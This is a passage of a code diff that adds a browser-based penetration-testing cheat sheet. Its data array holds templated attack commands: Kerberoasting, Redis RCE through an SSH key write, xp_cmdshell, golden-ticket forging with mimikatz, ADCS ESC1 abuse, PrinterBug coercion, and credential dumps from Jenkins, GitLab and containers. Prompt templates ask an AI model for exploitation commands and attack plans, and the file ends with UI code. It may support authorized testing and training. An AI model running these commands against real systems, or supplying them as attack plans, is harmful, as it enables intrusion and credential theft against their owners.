+    {name:'SSH keys',cmd:'find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null'},
+  ]},
+
+  /* ── AI / LLM ENUM ── */
+  {id:'ai01',cat:'llmenum',icon:'🤖',title:'AI Recon One-Liner',desc:'Full AD recon one-liner combining bloodhound-python, Kerberoasting, and AS-REP roasting',tags:['recon','ai'],variants:[
+    {name:'Full AD recon one-liner',cmd:'bloodhound-python -d {DOMAIN} -dc {DC} -u {USER} -p {PASS} -c All --zip && impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {DC} -request -outputfile kerberoast.hash && impacket-GetNPUsers {DOMAIN}/ -usersfile /tmp/users.txt -dc-ip {DC} -format hashcat -outputfile asrep.hash'},
+    {name:'Full web recon one-liner',cmd:'nmap -sV -sC {IP} -oN nmap.txt && gobuster dir -u http://{IP}:{PORT} -w {WORDLIST} -o gobuster.txt && nikto -h http://{IP}:{PORT} -o nikto.txt'},
+  ]},
+  {id:'ai02',cat:'llmenum',icon:'🤖',title:'Service Fingerprint → Attack Plan',desc:'Paste nmap output into Claude — get prioritised attack surface analysis',tags:['recon','ai'],variants:[
+    {name:'Context prompt template',cmd:'# Prompt template:\nTarget: {IP} | Domain: {DOMAIN}\nNmap output: [paste here]\n\nAnalyse the attack surface. List the 3 most promising attack vectors with specific commands. Focus on quick wins first.'},
+  ]},
+  {id:'ai03',cat:'llmenum',icon:'🤖',title:'BloodHound Path Explanation',desc:'Paste BloodHound attack path into Claude for step-by-step exploitation notes',tags:['domain','ai'],variants:[
+    {name:'BloodHound prompt template',cmd:'# Prompt template:\nDomain: {DOMAIN}\nAttack path from BloodHound:\n[GenericAll on X → MemberOf Y → AdminTo DC]\n\nExplain step-by-step how to exploit this path. Include exact commands for each hop using these creds: {USER}:{PASS}'},
+  ]},
+  {id:'ai04',cat:'llmenum',icon:'🤖',title:'Log / Output Analysis',desc:'Paste tool output into Claude for automated analysis and prioritisation',tags:['enum','ai'],variants:[
+    {name:'enum4linux analysis prompt',cmd:'# Prompt template:\nTarget: {IP} | Domain: {DOMAIN}\nenum4linux output:\n[paste full output here]\n\nIdentify the most critical findings. List any usernames, shares, and misconfigs. What should I try first?'},
+    {name:'nmap output analysis',cmd:'# Prompt template:\nAnalyse this nmap output for {IP}. Identify vulnerable services, default credentials risk, and recommend exploitation order:\n[paste nmap output]'},
+  ]},
+  {id:'ai05',cat:'llmenum',icon:'🤖',title:'Custom Wordlist Generation',desc:'Generate a targeted wordlist based on company/user context using AI prompting',tags:['creds','ai'],variants:[
+    {name:'Company wordlist prompt',cmd:'# Prompt template:\nGenerate a targeted password wordlist for a pentest against {DOMAIN}.\nCompany info: [name, location, industry, key people from LinkedIn OSINT]\nInclude: name variants, years, common patterns (Company2024!, etc.). Output as one word per line.'},
+  ]},
+  {id:'ai06',cat:'llmenum',icon:'🤖',title:'PrivEsc Path Generator',desc:'Paste sysinfo + whoami /priv output — get ranked PrivEsc paths with tool commands',tags:['ai','privesc'],variants:[
+    {name:'Linux PrivEsc prompt',cmd:'# Prompt template:\nTarget OS: Linux | Kernel: [uname -a output]\nCurrent user: [id output]\nSudo permissions: [sudo -l output]\nSUID binaries: [find / -perm -4000 2>/dev/null]\n\nList the top 3 privilege escalation paths ranked by likelihood. For each: technique name, exact command, and GTFObins reference.'},
+    {name:'Windows PrivEsc prompt',cmd:'# Prompt template:\nTarget: Windows | whoami /priv output:\n[paste here]\n\nIdentify SeImpersonate, SeAssignPrimaryToken, AlwaysInstallElevated, unquoted service paths. Provide exact exploit commands.'},
+  ]},
+  {id:'ai07',cat:'llmenum',icon:'🤖',title:'Banner → Exploit Mapping',desc:'Paste service banners from nmap/nc — get CVE numbers and exact exploit paths',tags:['ai','recon'],variants:[
+    {name:'Banner mapping prompt',cmd:'# Prompt template:\nService banners from target {IP}:\n[paste nmap -sV output or banner grab results]\n\nFor each service: (1) identify exact version, (2) list known CVEs with CVSS >= 7.0, (3) provide searchsploit or Metasploit module path, (4) flag if unauthenticated RCE is possible.'},
+  ]},
+  {id:'ai08',cat:'llmenum',icon:'🤖',title:'Config Misconfig Explainer',desc:'Paste a config file — get security issues explained with fix commands',tags:['ai','web','enum'],variants:[
+    {name:'Config review prompt',cmd:'# Prompt template:\nConfig file type: [nginx/apache/sshd/smb.conf/web.config]\nTarget: {IP} | Service: {PORT}\n\n[paste config file contents]\n\nIdentify misconfigurations, over-permissive settings, and exposed sensitive data. For each issue: explain the risk, provide the fix, and give the CVE/CWE if applicable.'},
+  ]},
+  {id:'ai09',cat:'llmenum',icon:'🤖',title:'Log-to-Exploit Chain Generator',desc:'Paste log output — get attack timeline reconstruction and next-step guidance',tags:['ai','enum'],variants:[
+    {name:'Log chain prompt',cmd:'# Prompt template:\nLog type: [Apache/Windows Event/auth.log/Sysmon]\nTarget environment: {IP} | {DOMAIN}\n\n[paste log entries]\n\nReconstruct the attack timeline. Identify: (1) initial access vector, (2) lateral movement indicators, (3) persistence mechanisms, (4) data accessed. Suggest next exploitation steps.'},
+  ]},
+  {id:'ai10',cat:'llmenum',icon:'🤖',title:'Credential Spray Strategy Builder',desc:'Paste password policy + user list — get a safe spray strategy with timing',tags:['ai','creds','domain'],variants:[
+    {name:'Spray strategy prompt',cmd:'# Prompt template:\nDomain: {DOMAIN}\nPassword policy:\n- Min length: X | Complexity: Y | Lockout threshold: Z | Observation window: W min\nUser list sample: {USER}, [others]\nCompany info: [name, location, founded, industry]\n\nGenerate a safe password spray strategy with candidate password list, safe timing, and CME/Kerbrute command with correct delay flags.'},
+  ]},
+  {id:'ai11',cat:'llmenum',icon:'🤖',title:'ADCS Attack Planner',desc:'Paste Certipy output — get step-by-step ADCS exploitation plan mapped to ESC1-ESC13',tags:['ai','adcs','domain'],variants:[
+    {name:'ADCS planner prompt',cmd:'# Prompt template:\nDomain: {DOMAIN} | DC: {DC}\nCertipy find output:\n[paste certipy find -vulnerable output]\n\nIdentify all exploitable ADCS misconfigurations (ESC1-ESC13). For each: ESC category, exact certipy command chain, and required privileges.'},
+  ]},
+  {id:'ai12',cat:'llmenum',icon:'🤖',title:'API Recon → Attack Plan',desc:'Paste API spec or endpoint list — get an attack plan targeting auth, IDOR, injection',tags:['ai','web','enum'],variants:[
+    {name:'API attack plan prompt',cmd:'# Prompt template:\nAPI base URL: http://{IP}:{PORT}/api\nAuthentication: [Bearer/Basic/API Key/None]\nEndpoints discovered:\n[paste endpoint list or OpenAPI JSON]\n\nGenerate an API attack plan: auth bypass, IDOR test cases, injection points, mass assignment targets, rate limiting bypass. Include exact curl/ffuf commands.'},
+  ]},
+  {id:'ai13',cat:'llmenum',icon:'🤖',title:'Cloud Misconfig Explainer',desc:'Paste AWS/Azure/GCP policy JSON — get exploitable misconfiguration walkthrough',tags:['ai','cloud','iam'],variants:[
+    {name:'AWS IAM policy review',cmd:'# Prompt template:\nCloud provider: AWS/Azure/GCP\nAccount context: {USER} | {DOMAIN}\nPolicy/Config output:\n[paste IAM policy JSON or ScoutSuite finding]\n\nIdentify: (1) privilege escalation paths, (2) data exfiltration vectors, (3) lateral movement opportunities. For each: describe risk and provide exact CLI exploit command.'},
+  ]},
+  {id:'ai14',cat:'llmenum',icon:'🤖',title:'Screenshot → Recon Summary',desc:'Describe what you see in a web screenshot — get tech stack, attack surface, priority tests',tags:['ai','web','recon'],variants:[
+    {name:'Screenshot recon prompt',cmd:'# Prompt template:\nURL: http://{IP}:{PORT} | Screenshot taken: [timestamp]\n\nFrom the web page visible, identify:\n1. Technology stack and version indicators\n2. Login forms and auth mechanisms\n3. Input fields and potential injection points\n4. Error messages leaking info\n5. Recommended first 3 attacks with commands.'},
+  ]},
+  {id:'ai15',cat:'llmenum',icon:'🤖',title:'Tool Output Summariser',desc:'Paste any recon tool output — get concise finding summary with critical items highlighted',tags:['ai','enum','recon'],variants:[
+    {name:'Generic tool output prompt',cmd:'# Prompt template:\nTool: [nmap/enum4linux/ldapsearch/gobuster/nikto/certipy/etc.]\nTarget: {IP} | {DOMAIN}\n\n[paste full tool output]\n\nSummarise concisely:\n1. CRITICAL findings (immediate exploitation potential)\n2. HIGH findings (significant attack surface)\n3. MEDIUM findings (useful context)\n4. Recommended next commands based on these results.'},
+  ]},
+
+  /* ── REPORTING ── */
+  {id:'r01',cat:'reporting',icon:'📝',title:'Note-Taking Template',desc:'Quick structured note template for each host',tags:['recon'],variants:[
+    {name:'Host note template',cmd:'# HOST: {IP} | {DOMAIN}\n# Date: $(date)\n# Status: [in-progress / exploited / escalated]\n\n## Open Ports\n\n## Credentials Found\n\n## Vulnerabilities\n\n## Exploitation Notes\n\n## Post-Exploitation\n\n## Recommendations'},
+  ]},
+  {id:'r02',cat:'reporting',icon:'📝',title:'Screenshot + Evidence',desc:'Capture evidence for pentest report',tags:['recon'],variants:[
+    {name:'gowitness screenshot',cmd:'gowitness single http://{IP}:{PORT} -o ./screenshots'},
+    {name:'gowitness multi-URL',cmd:'gowitness file -f urls.txt -o ./screenshots --threads 10'},
+    {name:'flameshot',cmd:'flameshot gui'},
+  ]},
+  {id:'r03',cat:'reporting',icon:'📝',title:'CVE Lookup',desc:'Quickly look up CVEs for identified service versions',tags:['recon'],variants:[
+    {name:'searchsploit',cmd:'searchsploit {DOMAIN}'},
+    {name:'nmap script + version',cmd:'nmap -sV --script vulners -p {PORT} {IP}'},
+  ]},
+  {id:'r04',cat:'reporting',icon:'📝',title:'Post-Exploit Checklist',desc:'Quick win checklist after getting a shell',tags:['privesc','lateral'],variants:[
+    {name:'Linux post-exploit enum',cmd:'id && whoami && hostname && cat /etc/os-release\nuname -a\nss -tlnp\nsudo -l\nfind / -perm -4000 2>/dev/null\ncrontab -l'},
+    {name:'Windows post-exploit enum',cmd:'whoami /all\nnet users\nnet localgroup administrators\nsysteminfo\nnetstat -ano\nwmic product get name,version'},
+  ]},
+
+  /* ── SERVICES ENUM ── */
+  {id:'svc01',cat:'services',icon:'📡',title:'SNMP Enumeration',desc:'Walk SNMP MIBs for system info, users, routes, processes',tags:['enum','snmp'],variants:[
+    {name:'snmpwalk v2c',cmd:'snmpwalk -v2c -c public {IP} 1.3.6.1.2.1'},
+    {name:'snmp-check full',cmd:'snmp-check {IP} -c public'},
+    {name:'nmap SNMP scripts',cmd:'nmap -sU -p 161 --script snmp-brute,snmp-info,snmp-interfaces,snmp-processes {IP}'},
+    {name:'onesixtyone community bruteforce',cmd:'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {IP}'},
+  ]},
+  {id:'svc02',cat:'services',icon:'🖥️',title:'RDP Enumeration',desc:'Fingerprint RDP, check NLA, bluekeep',tags:['enum','recon'],variants:[
+    {name:'nmap RDP scripts',cmd:'nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 {IP}'},
+    {name:'xfreerdp',cmd:'xfreerdp /u:{USER} /p:{PASS} /v:{IP} /cert-ignore'},
+    {name:'BlueKeep check',cmd:'nmap -p 3389 --script rdp-vuln-ms12-020 {IP}'},
+  ]},
+  {id:'svc03',cat:'services',icon:'🔐',title:'SSH Enumeration',desc:'Fingerprint SSH version, algorithms, auth methods',tags:['enum','recon'],variants:[
+    {name:'SSH version banner',cmd:'ssh -v {USER}@{IP} 2>&1 | head -30'},
+    {name:'nmap SSH scripts',cmd:'nmap -p 22 --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey {IP}'},
+    {name:'SSH tunneling',cmd:'ssh -L {LPORT}:{IP}:{PORT} {USER}@{LHOST} -N'},
+  ]},
+  {id:'svc04',cat:'services',icon:'📁',title:'FTP Enumeration',desc:'Enumerate FTP: anonymous access, version, banners',tags:['enum','recon'],variants:[
+    {name:'Anonymous login test',cmd:'ftp -n {IP}\nuser anonymous anonymous\nls -la'},
+    {name:'nmap FTP scripts',cmd:'nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor {IP}'},
+    {name:'Download all files',cmd:'wget -r --no-passive ftp://anonymous:anonymous@{IP}/'},
+  ]},
+  {id:'svc05',cat:'services',icon:'🔴',title:'Redis Enumeration',desc:'Enumerate Redis: unauthenticated access, config read, RCE via cron/SSH',tags:['enum','exploit'],variants:[
+    {name:'Connect and info',cmd:'redis-cli -h {IP} -p 6379 info'},
+    {name:'Dump all keys',cmd:'redis-cli -h {IP} keys "*"'},
+    {name:'RCE via SSH key write',cmd:'redis-cli -h {IP} config set dir /root/.ssh\nredis-cli -h {IP} config set dbfilename authorized_keys\nredis-cli -h {IP} set payload "$(cat ~/.ssh/id_rsa.pub)"\nredis-cli -h {IP} bgsave'},
+  ]},
+  {id:'svc06',cat:'services',icon:'🍃',title:'MongoDB Enumeration',desc:'Enumerate MongoDB: unauthenticated access, database listing',tags:['enum','exploit'],variants:[
+    {name:'Connect no auth',cmd:'mongosh {IP}:27017'},
+    {name:'List databases',cmd:'mongosh {IP}:27017 --eval "db.adminCommand({listDatabases:1})"'},
+    {name:'mongodump all data',cmd:'mongodump --host {IP} --port 27017 --out /tmp/mongodump'},
+  ]},
+  {id:'svc07',cat:'services',icon:'🗄️',title:'MSSQL Enumeration',desc:'Enumerate MSSQL: version, users, xp_cmdshell, linked servers',tags:['enum','exploit'],variants:[
+    {name:'impacket mssqlclient',cmd:'impacket-mssqlclient {DOMAIN}/{USER}:{PASS}@{IP} -windows-auth'},
+    {name:'nmap MSSQL scripts',cmd:'nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell {IP}'},
+    {name:'xp_cmdshell execution',cmd:'impacket-mssqlclient {DOMAIN}/{USER}:{PASS}@{IP} -windows-auth -query "EXEC xp_cmdshell \'whoami\'"'},
+  ]},
+  {id:'svc08',cat:'services',icon:'📡',title:'Password Policy Extraction',desc:'Extract domain and local password policy to plan spray strategy',tags:['enum','domain','creds'],variants:[
+    {name:'CME password policy',cmd:'crackmapexec smb {DC} -u {USER} -p {PASS} --pass-pol'},
+    {name:'enum4linux policy',cmd:'enum4linux -P {IP}'},
+    {name:'net accounts (on box)',cmd:'net accounts /domain'},
+  ]},
+  {id:'svc09',cat:'services',icon:'🎫',title:'Token / Session Enumeration',desc:'Find and abuse tokens, impersonation privileges, and active sessions',tags:['enum','privesc','token'],variants:[
+    {name:'Check current token privileges',cmd:'whoami /priv'},
+    {name:'PrintSpoofer (SeImpersonate)',cmd:'.\\PrintSpoofer.exe -i -c "cmd.exe /c whoami"'},
+    {name:'GodPotato (SeImpersonate)',cmd:'.\\GodPotato.exe -cmd "cmd /c whoami"'},
+  ]},
+
+  /* ── ADCS / KERBEROS ── */
+  {id:'adcs01',cat:'adcs',icon:'🏛️',title:'ADCS Enumeration (Certipy)',desc:'Enumerate certificate templates, CAs, and misconfigurations',tags:['adcs','enum','domain'],variants:[
+    {name:'Full AD CS enum',cmd:'certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC} -stdout'},
+    {name:'Find vulnerable templates',cmd:'certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC} -vulnerable -stdout'},
+    {name:'ESC1 — request cert as any user',cmd:'certipy req -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC} -target {DC} -template User -upn Administrator@{DOMAIN}'},
+    {name:'ESC1 — authenticate with cert (PKINIT)',cmd:'certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {DC}'},
+    {name:'ESC8 — NTLM relay to ADCS HTTP',cmd:'certipy relay -target http://{DC}/certsrv/certfnsh.asp -template DomainController'},
+  ]},
+  {id:'adcs02',cat:'adcs',icon:'🏛️',title:'Shadow Credentials / PKINIT',desc:'Abuse msDS-KeyCredentialLink for credential theft without password',tags:['adcs','domain','exploit'],variants:[
+    {name:'pyWhisker (Linux)',cmd:'python3 pyWhisker.py -d {DOMAIN} -u {USER} -p {PASS} --target {USER} --action add'},
+    {name:'Certipy shadow creds',cmd:'certipy shadow auto -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC} -target {USER}'},
+  ]},
+  {id:'adcs03',cat:'adcs',icon:'🎟️',title:'Golden / Silver Ticket',desc:'Forge Kerberos tickets using KRBTGT or service account hash',tags:['kerberos','exploit','domain'],variants:[
+    {name:'Golden ticket (mimikatz)',cmd:'mimikatz.exe "kerberos::golden /domain:{DOMAIN} /sid:S-1-5-21-XXXX /krbtgt:{HASH} /user:Administrator /ptt" "exit"'},
+    {name:'Golden ticket (ticketer)',cmd:'impacket-ticketer -nthash {HASH} -domain-sid S-1-5-21-XXXX -domain {DOMAIN} Administrator'},
+    {name:'Overpass-the-Hash',cmd:'mimikatz.exe "sekurlsa::pth /user:{USER} /domain:{DOMAIN} /ntlm:{HASH} /run:powershell.exe" "exit"'},
+  ]},
+  {id:'adcs04',cat:'adcs',icon:'🎟️',title:'Constrained Delegation Abuse',desc:'Abuse S4U2Proxy with constrained or resource-based constrained delegation',tags:['kerberos','domain','exploit'],variants:[
+    {name:'Find constrained delegation',cmd:'Get-DomainComputer -TrustedToAuth | Select-Object -Property DnsHostName,msds-allowedtodelegateto'},
+    {name:'impacket getST S4U2Proxy',cmd:'impacket-getST -spn CIFS/{DC} {DOMAIN}/{USER}:{PASS} -impersonate Administrator'},
+    {name:'Rubeus S4U',cmd:'Rubeus.exe s4u /user:{USER} /rc4:{HASH} /impersonateuser:Administrator /msdsspn:"CIFS/{DC}" /ptt'},
+  ]},
+  {id:'adcs05',cat:'adcs',icon:'🔑',title:'GPO / ACL Misconfiguration',desc:'Find and abuse GPO write permissions and dangerous ACL entries',tags:['domain','enum','adcs'],variants:[
+    {name:'Find writable GPOs',cmd:'Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.ObjectAceType -match "Group-Policy-Container" -and $_.ActiveDirectoryRights -match "Write|CreateChild"}'},
+    {name:'BloodHound ACL query (PowerView)',cmd:'Find-InterestingDomainAcl -ResolveGUIDs | Where {$_.IdentityReferenceName -match "{USER}"}'},
+  ]},
+  {id:'adcs06',cat:'adcs',icon:'🔑',title:'Unconstrained Delegation',desc:'Capture TGTs from authenticating users via unconstrained delegation boxes',tags:['kerberos','domain','exploit'],variants:[
+    {name:'Find unconstrained delegation',cmd:'Get-DomainComputer -Unconstrained | Select-Object DnsHostName'},
+    {name:'Monitor for incoming TGTs (Rubeus)',cmd:'Rubeus.exe monitor /interval:5 /nowrap'},
+    {name:'Force DC authentication (PrinterBug)',cmd:'python3 printerbug.py {DOMAIN}/{USER}:{PASS}@{DC} {LHOST}'},
+  ]},
+
+  /* ── CLOUD / K8s / CI-CD ── */
+  {id:'cl01',cat:'cloud',icon:'☁️',title:'AWS IAM Misconfiguration',desc:'Enumerate over-permissive IAM roles, policies, and S3 buckets',tags:['cloud','iam','enum'],variants:[
+    {name:'Check caller identity',cmd:'aws sts get-caller-identity'},
+    {name:'Enumerate attached policies',cmd:'aws iam list-attached-user-policies --user-name {USER}'},
+    {name:'List all S3 buckets',cmd:'aws s3 ls'},
+    {name:'Pacu AWS exploitation',cmd:'python3 pacu.py'},
+    {name:'ScoutSuite full audit',cmd:'scout aws --report-dir ./scout_report'},
+  ]},
+  {id:'cl02',cat:'cloud',icon:'🔵',title:'Azure / Entra ID Recon',desc:'Enumerate Azure AD users, service principals, and storage',tags:['cloud','iam','enum'],variants:[
+    {name:'AADInternals tenant recon',cmd:'Import-Module AADInternals\nInvoke-AADIntReconAsOutsider -DomainName {DOMAIN}'},
+    {name:'ROADrecon graph dump',cmd:'roadrecon gather -u {USER}@{DOMAIN} -p {PASS}\nroadrecon gui'},
+    {name:'TokenTactics — device code phish',cmd:'Import-Module TokenTactics\nGet-AzureToken -Client MSGraph'},
+  ]},
+  {id:'cl03',cat:'cloud',icon:'⚙️',title:'Kubernetes / Container Recon',desc:'Enumerate K8s RBAC, service accounts, secrets, and container escape paths',tags:['k8s','enum','cloud'],variants:[
+    {name:'Get cluster info',cmd:'kubectl cluster-info\nkubectl get nodes'},
+    {name:'List secrets',cmd:'kubectl get secrets --all-namespaces'},
+    {name:'Check RBAC permissions',cmd:'kubectl auth can-i --list\nkubectl auth can-i create pods --namespace kube-system'},
+    {name:'CDK — container escape check',cmd:'./cdk evaluate'},
+  ]},
+  {id:'cl04',cat:'cloud',icon:'🐳',title:'Docker / CI-CD Recon',desc:'Enumerate exposed Docker sockets, registries, and CI/CD secrets',tags:['k8s','enum','cloud'],variants:[
+    {name:'Check Docker socket',cmd:'ls -la /var/run/docker.sock\ncurl -s --unix-socket /var/run/docker.sock http://localhost/containers/json'},
+    {name:'Extract env vars from container',cmd:'docker inspect $(docker ps -q) | jq ".[].Config.Env"'},
+    {name:'GitLab CI/CD secrets',cmd:'curl -H "PRIVATE-TOKEN: {PASS}" https://{IP}/api/v4/projects/PROJECT_ID/variables'},
+    {name:'Jenkins creds dump',cmd:'curl -u {USER}:{PASS} http://{IP}:{PORT}/credentials/store/system/domain/_/api/json?depth=2'},
+  ]},
+
+  /* ── OSINT / SUPPLY CHAIN ── */
+  {id:'os01',cat:'osint',icon:'🔎',title:'Certificate Transparency Recon',desc:'Find subdomains and hosts via CT logs without hitting the target',tags:['recon','osint'],variants:[
+    {name:'crt.sh query',cmd:'curl -s "https://crt.sh/?q=%.{DOMAIN}&output=json" | jq ".[].name_value" | sort -u'},
+    {name:'subfinder CT mode',cmd:'subfinder -d {DOMAIN} -sources certspotter,crtsh -all -o ct_subs.txt'},
+    {name:'amass with CT',cmd:'amass enum -d {DOMAIN} -src -ip -o amass_ct.txt'},
+  ]},
+  {id:'os02',cat:'osint',icon:'💧',title:'Breach Data Lookup',desc:'Check if target accounts appear in public breach databases',tags:['osint','creds'],variants:[
+    {name:'Have I Been Pwned API',cmd:'curl -s -H "hibp-api-key: API_KEY" https://haveibeenpwned.com/api/v3/breachedaccount/{USER}@{DOMAIN}'},
+    {name:'h8mail breach lookup',cmd:'h8mail -t {USER}@{DOMAIN} -o breach_results.txt'},
+  ]},
+  {id:'os03',cat:'osint',icon:'🔗',title:'Supply Chain Recon',desc:'Identify third-party dependencies, npm/pip packages, and CI/CD exposure',tags:['supply','recon','osint'],variants:[
+    {name:'npm package audit',cmd:'npm audit --json | jq ".vulnerabilities"'},
+    {name:'Dependency check (OWASP)',cmd:'dependency-check --project {DOMAIN} --scan ./src --format JSON'},
+    {name:'truffleHog secrets scan',cmd:'trufflehog git https://github.com/TARGET/REPO --json > secrets.json'},
+    {name:'gitleaks repo scan',cmd:'gitleaks detect --source . --report-path gitleaks.json'},
+  ]},
+  {id:'os04',cat:'osint',icon:'🌐',title:'OSINT Gathering',desc:'Passive reconnaissance via DNS, email, social media, and metadata',tags:['osint','recon'],variants:[
+    {name:'theHarvester email/subdomain',cmd:'theHarvester -d {DOMAIN} -b all -l 500 -f harvest_output'},
+    {name:'Shodan host search',cmd:'shodan search org:"{DOMAIN}" --fields ip_str,port,org --limit 100'},
+    {name:'Shodan by IP',cmd:'shodan host {IP}'},
+    {name:'metagoofil document harvest',cmd:'metagoofil -d {DOMAIN} -t pdf,docx,xlsx -o ./meta_output'},
+  ]},
+
+  /* ── SCREENSHOT RECON ── */
+  {id:'ss01',cat:'screenshot',icon:'📸',title:'gowitness Web Screenshots',desc:'Screenshot web services at scale for visual attack surface mapping',tags:['recon','web'],variants:[
+    {name:'Screenshot single URL',cmd:'gowitness single http://{IP}:{PORT} --screenshot-path ./screenshots'},
+    {name:'Screenshot from nmap XML',cmd:'gowitness nmap -f nmap.xml --screenshot-path ./screenshots --open'},
+    {name:'Screenshot from URL list',cmd:'gowitness file -f urls.txt --screenshot-path ./screenshots --threads 20'},
+    {name:'Scan subnet + screenshot',cmd:'gowitness scan --cidr {IP}/24 --screenshot-path ./screenshots'},
+  ]},
+  {id:'ss02',cat:'screenshot',icon:'📸',title:'EyeWitness Screenshot Recon',desc:'Screenshot web, RDP, and VNC services with automatic categorisation',tags:['recon','web'],variants:[
+    {name:'Web targets from file',cmd:'python3 EyeWitness.py -f urls.txt --web --threads 10 -d ./eyewitness'},
+    {name:'Nmap XML input',cmd:'python3 EyeWitness.py -x nmap.xml --web --all-protocols -d ./eyewitness'},
+    {name:'Screenshot RDP targets',cmd:'python3 EyeWitness.py -f rdp_hosts.txt --rdp -d ./eyewitness'},
+  ]},
+  {id:'ss03',cat:'screenshot',icon:'🔭',title:'Aquatone Visual Recon',desc:'Screenshot + HTTP response analysis across large scope',tags:['recon','web'],variants:[
+    {name:'From subdomain list',cmd:'cat subdomains.txt | aquatone -ports xlarge -out ./aquatone'},
+    {name:'From nmap XML',cmd:'cat nmap.xml | aquatone -nmap -out ./aquatone'},
+  ]},
+];
+
+/* ════════════════════════════════════════════
+   STATE
+════════════════════════════════════════════ */
+var activeCategory='all';
+var activeTagFilter=null;
+var activeSearch='';
+var selectedCheat=null;
+var VARS={LHOST:'',LPORT:'',IP:'',PORT:'',DOMAIN:'',DC:'',USER:'',PASS:'',HASH:'',WORDLIST:''};
+
+/* ── VAR INPUTS ── */
+Object.keys(VARS).forEach(function(k){
+  var el=document.getElementById('v_'+k);
+  if(!el) return;
+  el.addEventListener('input',function(){ VARS[k]=el.value.trim(); if(selectedCheat) renderRightPanel(selectedCheat); });
+});
+
+/* ── SUBSTITUTE VARS ── */
+function subVars(cmd){
+  return cmd.replace(/\{([A-Z_]+)\}/g,function(match,key){ return VARS[key]||match; });
+}
+
+/* ── HIGHLIGHT CMD ── */
+function highlightCmd(raw){
+  var subbed=subVars(raw);
+  var esc=subbed.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  esc=esc.replace(/\{([A-Z_]+)\}/g,'<span class="var-highlight">{$1}</span>');
+  esc=esc.replace(/((?:^|\s)-{1,2}[a-zA-Z][a-zA-Z0-9_-]*)/gm,'<span class="cmd-flag">$1</span>');
+  esc=esc.replace(/(#[^\n]*)/g,'<span class="cmd-comment">$1</span>');
+  esc=esc.replace(/(https?:\/\/[^\s"'<>]+)/g,'<span class="cmd-url">$1</span>');
+  return esc;
+}
+
+/* ── BUILD SIDEBAR ── */
+function buildSidebar(){
+  var catList=document.getElementById('catList');
+  catList.innerHTML='';
+  CATS.forEach(function(cat){
+    var count=CHEATS.filter(function(c){ return c.cat===cat.id; }).length;
+    var div=document.createElement('div');
+    div.className='sb-cat';
+    div.dataset.cat=cat.id;
+    div.tabIndex=0;
+    div.setAttribute('role','button');
+    div.setAttribute('aria-label',cat.label+' — '+count+' cheats');
+    div.innerHTML='<div class="sb-cat-left">'
+      +'<div class="sb-cat-dot" style="background:'+cat.dot+'"></div>'
+      +'<span class="sb-cat-label">'+cat.label+'</span>'
+      +'</div>'
+      +'<span class="sb-cat-count">'+count+'</span>';
+    function activate(){ setCategory(cat.id,cat.label); }
+    div.addEventListener('click',activate);
+    div.addEventListener('keydown',function(e){ if(e.key==='Enter'||e.key===' '){ e.preventDefault(); activate(); } });
+    catList.appendChild(div);
+  });
+  document.getElementById('count-all').textContent=CHEATS.length;
+}
+
+/* ── SET CATEGORY ── */
+function setCategory(catId,label){
+  activeCategory=catId;
+  document.querySelectorAll('.sb-cat, .sb-all').forEach(function(el){ el.classList.remove('active'); });
+  if(catId==='all'){
+    document.getElementById('cat-all').classList.add('active');
+    document.getElementById('activeLabel').textContent='All Cheats';
+  } else {
+    document.querySelectorAll('.sb-cat').forEach(function(el){ if(el.dataset.cat===catId) el.classList.add('active'); });
+    document.getElementById('activeLabel').textContent=label;
+  }
+  renderCards();
+}
+
+/* ── TAG FILTERS ── */
+var ALL_TAGS=[];
+(function(){
+  var seen={};
+  CHEATS.forEach(function(c){ c.tags.forEach(function(t){ if(!seen[t]){ seen[t]=true; ALL_TAGS.push(t); } }); });
+})();
+
+function buildTagFilters(){
+  var wrap=document.getElementById('tagFilters');
+  wrap.innerHTML='';
+  ALL_TAGS.forEach(function(tag){
+    var btn=document.createElement('button');
+    btn.className='ch-tag-filter';
+    btn.textContent=tag;
+    btn.dataset.tag=tag;
+    btn.setAttribute('aria-pressed','false');
+    btn.addEventListener('click',function(){
+      if(activeTagFilter===tag){ activeTagFilter=null; btn.classList.remove('active'); btn.setAttribute('aria-pressed','false'); }
+      else {
+        document.querySelectorAll('.ch-tag-filter').forEach(function(b){ b.classList.remove('active'); b.setAttribute('aria-pressed','false'); });
+        activeTagFilter=tag; btn.classList.add('active'); btn.setAttribute('aria-pressed','true');
+      }
+      renderCards();
+    });
+    wrap.appendChild(btn);
+  });
+}
+
+/* ── RENDER CARDS ── */
+function renderCards(){
+  var wrap=document.getElementById('cardsWrap');
+  var filtered=CHEATS.filter(function(c){
+    if(activeCategory!=='all'&&c.cat!==activeCategory) return false;
+    if(activeTagFilter&&!c.tags.includes(activeTagFilter)) return false;
+    if(activeSearch){
+      var s=activeSearch.toLowerCase();
+      return c.title.toLowerCase().includes(s)||c.desc.toLowerCase().includes(s)||c.tags.some(function(t){ return t.includes(s); })||c.variants.some(function(v){ return v.cmd.toLowerCase().includes(s)||v.name.toLowerCase().includes(s); });
+    }
+    return true;
+  });
+  document.getElementById('visibleCount').textContent=filtered.length+' cheats';
+  wrap.innerHTML='';
+  filtered.forEach(function(cheat){
+    var div=document.createElement('div');
+    div.className='cheat-card'+(selectedCheat&&selectedCheat.id===cheat.id?' selected':'');
+    div.dataset.id=cheat.id;
+    div.tabIndex=0;
+    div.setAttribute('role','listitem');
+    div.setAttribute('aria-label',cheat.title+' — '+cheat.desc);
+    div.innerHTML='<div class="cc-top">'
+      +'<span class="cc-icon">'+cheat.icon+'</span>'
+      +'<span class="cc-title">'+cheat.title+'</span>'
+      +'</div>'
+      +'<div class="cc-desc">'+cheat.desc+'</div>'
+      +'<div class="cc-tags">'+cheat.tags.map(function(t){ return '<span class="cc-tag tag-'+t+'">'+t+'</span>'; }).join('')+'</div>';
